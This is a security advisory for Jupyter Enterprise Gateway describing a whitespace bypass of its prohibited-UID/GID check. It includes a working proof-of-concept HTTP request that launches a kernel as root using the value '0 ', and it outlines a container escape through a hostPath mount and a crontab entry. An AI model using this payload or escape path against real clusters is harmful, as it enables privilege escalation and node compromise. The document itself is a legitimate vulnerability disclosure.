# [C] Jupyter Enterprise Gateway: ContainerProcessProxy._enforce_prohibited_ids Bypass

## Summary
Severity: Critical
Advisory: GHSA-chq7-94j8-cj28
CVE: CVE-2026-44180
CWE: CWE-180, CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-03
Source: https://github.com/advisories/GHSA-chq7-94j8-cj28
Type: github-advisory

## Affected
- PyPI: `jupyter_enterprise_gateway` — affected >=2.0.0rc1 <3.3.0

## Details
### Summary

Jupyter Enterprise Gateway has a prohibited UID and GID feature that by default prevents launching kernels with UID or GID 0 (root).
This can be bypassed. It is possible to launch kernels with a prohibited UID and/or GID by using a specially crafted `KERNEL_UID` or `KERNEL_GID` value.

The feature is described in the documentation: 

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L103-L107

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L88-L92

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/deploy-kubernetes.md?plain=1#L769

### Details

The `prohibited_uids` and `prohibited_uids` are set based of the OS env var `EG_PROHIBITED_UIDS` and `EG_PROHIBITED_GIDS`, and default to the string `0`.

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L29-L30

The checks https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L113 and https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L119 look for the user supplied `KERNEL_UID` / `KERNEL_GID` string in the `prohibited_uids` / `prohibited_gids` strings. These checks can be bypassed by including whitespace, for example the string `0 ` (trailing space).

The user supplied string is used in the Kubernetes manifest at https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L35 and https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L38 where they are parsed as an integer in the Jinja2 template - which will ignore the whitespace.

### PoC


#### How it is meant to work

Trying `0` gets denied, as expected.

```bash
xh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{"KERNEL_POD_NAME":"bdawg", "KERNEL_UID": "0", "KERNEL_GID": "0"}'
```

```
HTTP/1.1 403 Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!
Content-Length: 94
Content-Type: application/json
Date: Mon, 14 Jul 2025 12:57:09 GMT
Server: TornadoServer/6.4.1
X-Content-Type-Options: nosniff
```

```json
{
    "reason": "Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!",
    "message": ""
}
```

#### Exploit bypassing the checks

Using `0 ` with a trailing space, bypasses the check.

```bash
xh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{"KERNEL_POD_NAME":"bdawg", "KERNEL_UID": "0 ", "KERNEL_GID": "0 "}'
```

```
HTTP/1.1 201 Created
Content-Length: 172
Content-Type: application/json
Date: Mon, 14 Jul 2025 14:15:19 GMT
Location: /api/kernels/17eee032-994f-4dd2-8ade-87169c300a40
Server: TornadoServer/6.4.1
X-Content-Type-Options: nosniff
```

```
{
    "id": "17eee032-994f-4dd2-8ade-87169c300a40",
    "name": "python_kubernetes",
    "last_activity": "2025-07-14T14:15:21.468155Z",
    "execution_state": "starting",
    "connections": 0
}
```

The pod is successfully scheduled.

Inspecting the container we can see it is running as `root`:

```bash
kubectl exec -it pod/bdawg -- bash
```

```
(base) root@bdawg3:~# id
uid=0(root) gid=0(root) groups=0(root),100(users)
```

If we had not supplied the `KERNEL_UID` / `KERNEL_GID` the container would have been running as UID:GID `1000:100` (`jovyan:users`).

### Impact

This input validation vulnerability allows running Jupyter kernels as root, which can be dangerous as it allows more attack surface, and may lead to container escapes, compromising the worker node and all workloads running on it. Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. It is possible to specify volume mounts, so one vector for a container escape is to use a `hostPath` R/W volume mount, use this UID/GID bypass to run as root, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.

Organisations running Jupyter Enterprise Gateway to host Jupyter Kernels on at least Kubernetes clusters (I've tested this), and possibly on any other supported container orchestration systems or systems that utilise the `KERNEL_UID` and `KERNEL_GID` variables with the `EG_PROHIBITED_UIDS` and `EG_PROHIBITED_GIDS` feature.

## References
- https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28
- https://github.com/jupyter-server/enterprise_gateway
- https://github.com/jupyter-server/enterprise_gateway/releases/tag/v3.3.0
